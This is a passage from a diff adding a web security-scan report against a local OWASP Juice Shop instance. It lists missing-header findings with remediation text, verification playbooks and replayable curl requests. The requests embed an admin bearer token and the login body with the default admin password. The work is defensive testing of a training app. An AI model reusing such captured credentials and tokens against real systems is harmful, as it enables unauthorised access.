+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/rest/user/whoami<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/rest/user/whoami \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/user/whoami \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/api/Addresss<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/api/Addresss \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/api/Addresss \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/api/BasketItems/{id}<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  -X DELETE \
+  http://localhost:3000/api/BasketItems/9 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  -X DELETE \
+  http://localhost:3000/api/BasketItems/9 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/api/Quantitys/<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/api/Quantitys/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/api/Quantitys/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/api/Recycles/<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/api/Recycles/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/api/Recycles/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
